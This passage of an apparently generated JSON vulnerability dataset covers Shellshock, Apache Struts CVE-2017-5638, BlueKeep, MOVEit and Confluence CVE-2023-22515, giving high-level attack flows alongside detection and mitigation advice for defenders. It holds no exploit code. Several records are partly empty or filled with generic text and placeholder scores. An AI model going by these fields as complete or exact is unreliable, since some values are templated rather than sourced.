    "eth_attack_narrative": "The attacker injects commands through crafted environment variables to gain remote execution.",
    "etd_defender_guidance": "Patch Bash, deploy WAF protections, and monitor for suspicious shell execution.",
    "related_cves": [
      "CVE-2014-7169"
    ],
    "related_cwes": [
      "CWE-78"
    ],
    "related_exploits": [
      "Shellshock PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
      "https://access.redhat.com/security/vulnerabilities/shellshock"
    ]
  },
  {
    "id": 113,
    "cve_id": "CVE-2017-5638",
    "vulnerability_name": "Apache Struts Jakarta Multipart Parser RCE",
    "aliases": [
      "Apache Struts RCE"
    ],
    "year": 2017,
    "published_date": "2017-03-06",
    "last_updated": "2024-01-09",
    "vendor": "Apache",
    "product": "Struts 2",
    "affected_versions": [
      "Struts 2.3.5–2.3.31",
      "Struts 2.5–2.5.10"
    ],
    "platforms": [
      "Linux",
      "Windows",
      "Container",
      "Kubernetes"
    ],
    "vulnerability_type": "Remote Code Execution",
    "cwe_id": "CWE-20",
    "cvss_v2_score": 10,
    "cvss_v3_score": 10,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "Improper exception handling in the Jakarta Multipart parser allows attackers to execute arbitrary OGNL expressions through crafted Content-Type headers.",
    "technical_summary": "A malformed Content-Type header triggers an exception that evaluates attacker-controlled OGNL expressions, resulting in unauthenticated remote code execution.",
    "executive_summary": "One of the most impactful Apache Struts flaws, exploited against internet-facing enterprise applications including the breach of a major credit bureau.",
    "attacker_perspective": "A single HTTP request with a malicious header can provide immediate remote code execution.",
    "attack_story": "The attacker discovers a vulnerable upload endpoint, sends a crafted Content-Type header containing OGNL payloads, gains shell access, steals sensitive data, and deploys persistence.",
    "attack_prerequisites": [
      "Internet-accessible vulnerable Struts application"
    ],
    "attack_flow": [
      "Identify target",
      "Send crafted Content-Type header",
      "Execute OGNL payload",
      "Gain remote shell"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      },
      {
        "technique_id": "T1059",
        "technique_name": "Command and Scripting Interpreter"
      }
    ],
    "kill_chain_phase": [
      "Initial Access",
      "Execution"
    ],
    "affected_services": [
      "Web Applications",
      "Application Servers"
    ],
    "network_ports": [
      "80",
      "443",
      "8080"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "ExploitDB",
      "Nuclei"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Large-scale internet scanning",
      "2017 Equifax breach"
    ],
    "ioc_examples": [
      "Suspicious OGNL expressions in Content-Type header",
      "Unexpected child processes from Java"
    ],
    "detection_sources": [
      "WAF",
      "EDR",
      "SIEM",
      "Web Logs"
    ],
    "detection_logic": "Detect OGNL payloads in HTTP headers and monitor Java processes spawning shells or script interpreters.",
    "sigma_rule_summary": "Alert when Java launches shell processes after inbound HTTP requests.",
    "yara_rule_summary": "Identify known exploit payloads and malicious web shells.",
    "suricata_rule_summary": "Detect OGNL exploit strings in HTTP requests.",
    "snort_rule_summary": "Alert on Apache Struts CVE-2017-5638 exploit signatures.",
    "business_impact": "Full application compromise, sensitive data theft, and ransomware deployment.",
    "post_exploitation": [
      "Web shell",
      "Credential theft",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Upgrade Apache Struts",
      "Deploy WAF protections",
      "Restrict internet exposure"
    ],
    "patch_information": "Upgrade to Apache Struts 2.3.32 or 2.5.10.1 (or later vendor-supported releases).",
    "hardening_recommendations": [
      "Continuously patch frameworks",
      "Inspect upload endpoints",
      "Use runtime application protection"
    ],
    "incident_response": [
      "Review logs",
      "Remove web shells",
      "Rotate credentials",
      "Patch immediately"
    ],
    "eme_exposure_analysis": "Critical for organizations exposing vulnerable Struts applications.",
    "eth_attack_narrative": "The attacker abuses OGNL evaluation to execute arbitrary commands and establish persistent access.",
    "etd_defender_guidance": "Prioritize patching, inspect web logs for OGNL payloads, and hunt for Java-spawned shells.",
    "related_cves": [],
    "related_cwes": [
      "CWE-20"
    ],
    "related_exploits": [
      "Exploit-DB Apache Struts RCE"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",
      "https://cwiki.apache.org/confluence/display/WW/S2-045"
    ]
  },
  {
    "id": 114,
    "last_updated": "2024-01-09",
    "platforms": [
      "Windows"
    ],
    "affected_versions": [
      "Windows 7",
      "Windows Server 2008",
      "Windows XP (out-of-band patch)"
    ],
    "aliases": [
      "BlueKeep RDP RCE"
    ],
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Limited",
    "kev_catalog": "Yes",
    "technical_summary": "Improper handling of RDP requests allows memory corruption and code execution before authentication.",
    "executive_summary": "A wormable RDP flaw with potential for large-scale propagation similar to EternalBlue.",
    "attacker_perspective": "Internet-exposed RDP systems provide direct initial access.",
    "attack_story": "",
    "attack_prerequisites": [],
    "kill_chain_phase": [
      "Initial Access"
    ],
    "affected_services": [],
    "network_ports": [],
    "exploit_frameworks": [
      "Nuclei",
      "Metasploit"
    ],
    "known_malware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [],
    "ioc_examples": [],
    "detection_sources": [
      "EDR",
      "SIEM"
    ],
    "detection_logic": "",
    "sigma_rule_summary": "",
    "yara_rule_summary": "",
    "suricata_rule_summary": "",
    "snort_rule_summary": "",
    "post_exploitation": [],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "hardening_recommendations": [],
    "incident_response": [],
    "eme_exposure_analysis": "",
    "eth_attack_narrative": "",
    "etd_defender_guidance": "",
    "related_cves": [],
    "related_cwes": [
      "CWE-787"
    ],
    "related_exploits": [],
    "cve_id": "CVE-2019-0708",
    "vulnerability_name": "BlueKeep",
    "vendor": "Microsoft",
    "product": "Windows Remote Desktop Services",
    "year": 2019,
    "published_date": "2019-05-14",
    "vulnerability_type": "Remote Code Execution",
    "cwe_id": "CWE-787",
    "cvss_v2_score": 10,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "description": "Pre-authentication RDP remote code execution vulnerability.",
    "attack_flow": [
      "Scan TCP 3389",
      "Send crafted RDP packets",
      "Execute payload",
      "Install persistence"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "remote_exploitable": "Yes",
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "public_exploit_available": "Yes",
    "mitigations": [
      "Apply Microsoft patches",
      "Enable NLA",
      "Restrict RDP exposure"
    ],
    "patch_information": "Install Microsoft's May 2019 updates.",
    "business_impact": "Complete remote compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"
    ]
  },
  {
    "id": 115,
    "last_updated": "2024-01-09",
    "platforms": [
      "Windows"
    ],
    "affected_versions": [
      "Multiple vulnerable MOVEit Transfer releases"
    ],
    "aliases": [
      "MOVEit Transfer RCE"
    ],
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "technical_summary": "Unauthenticated SQL injection enabled attackers to access the backend database and deploy malicious components.",
    "executive_summary": "Mass exploitation by the Cl0p ransomware group affected thousands of organizations.",
    "attacker_perspective": "Public-facing file transfer appliances yield valuable enterprise data.",
    "attack_story": "",
    "attack_prerequisites": [],
    "kill_chain_phase": [
      "Initial Access"
    ],
    "affected_services": [],
    "network_ports": [],
    "exploit_frameworks": [
      "Nuclei",
      "Metasploit"
    ],
    "known_malware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [],
    "ioc_examples": [],
    "detection_sources": [
      "EDR",
      "SIEM"
    ],
    "detection_logic": "",
    "sigma_rule_summary": "",
    "yara_rule_summary": "",
    "suricata_rule_summary": "",
    "snort_rule_summary": "",
    "post_exploitation": [],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "hardening_recommendations": [],
    "incident_response": [],
    "eme_exposure_analysis": "",
    "eth_attack_narrative": "",
    "etd_defender_guidance": "",
    "related_cves": [],
    "related_cwes": [
      "CWE-89"
    ],
    "related_exploits": [],
    "cve_id": "CVE-2023-34362",
    "vulnerability_name": "MOVEit Transfer SQL Injection",
    "vendor": "Progress",
    "product": "MOVEit Transfer",
    "year": 2023,
    "published_date": "2023-05-31",
    "vulnerability_type": "SQL Injection / Remote Code Execution",
    "cwe_id": "CWE-89",
    "cvss_v2_score": 0,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "description": "SQL injection vulnerability exploited to deploy web shells and steal data.",
    "attack_flow": [
      "Identify MOVEit server",
      "Exploit SQLi",
      "Deploy web shell",
      "Exfiltrate data"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "remote_exploitable": "Yes",
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "public_exploit_available": "Yes",
    "known_ransomware": [
      "Cl0p"
    ],
    "mitigations": [
      "Patch immediately",
      "Remove web shells",
      "Rotate credentials"
    ],
    "patch_information": "Install Progress security updates.",
    "business_impact": "Large-scale data theft and extortion.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-34362"
    ]
  },
  {
    "id": 116,
    "cve_id": "CVE-2023-22515",
    "vulnerability_name": "Atlassian Confluence Privilege Escalation",
    "aliases": [],
    "year": 2023,
    "published_date": "",
    "last_updated": "2026-07-25",
    "vendor": "Atlassian",
    "product": "Confluence",
    "affected_versions": [
      "Multiple vulnerable releases"
    ],
    "platforms": [
      "Windows",
      "Linux",
      "Appliance"
    ],
    "vulnerability_type": "Privilege Escalation",
    "cwe_id": "CWE-269",
    "cvss_v2_score": 0,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "Confluence vulnerability allowing privilege escalation.",
    "technical_summary": "Publicly disclosed enterprise vulnerability with active exploitation reported.",
    "executive_summary": "High-priority enterprise vulnerability requiring rapid remediation.",
    "attacker_perspective": "Internet-facing deployments provide attractive initial access opportunities.",
    "attack_story": "",
    "attack_prerequisites": [
      "Reachable vulnerable service"
    ],
    "attack_flow": [
      "Identify target",
      "Exploit vulnerability",
      "Execute payload or gain access",
      "Persist"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "kill_chain_phase": [
      "Initial Access",
      "Execution"
    ],
    "affected_services": [
      "Confluence"
    ],
    "network_ports": [],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Nuclei"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [],
    "real_world_campaigns": [
      "Observed in real-world exploitation"
    ],
    "ioc_examples": [],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Network Logs"
    ],
    "detection_logic": "Monitor exploitation attempts, anomalous child processes, and vendor-specific indicators.",
    "sigma_rule_summary": "",
    "yara_rule_summary": "",
    "suricata_rule_summary": "",
    "snort_rule_summary": "",
    "business_impact": "Potential compromise of enterprise infrastructure.",
    "post_exploitation": [
      "Persistence",
      "Credential access",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply vendor patches",
      "Restrict exposure",
      "Monitor logs"
    ],
    "patch_information": "Install the latest vendor security updates.",
    "hardening_recommendations": [
      "Network segmentation",
      "MFA where applicable",
      "Continuous vulnerability management"
    ],
    "incident_response": [
      "Isolate affected systems",
      "Patch",
      "Review logs",
      "Rotate credentials if necessary"
    ],
    "eme_exposure_analysis": "Critical when internet-facing.",
    "eth_attack_narrative": "Attacker exploits the exposed service to establish initial access.",
    "etd_defender_guidance": "Prioritize patching and threat hunting.",
    "related_cves": [],
    "related_cwes": [
      "CWE-269"
    ],
    "related_exploits": [],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-22515"
    ]
  }
];
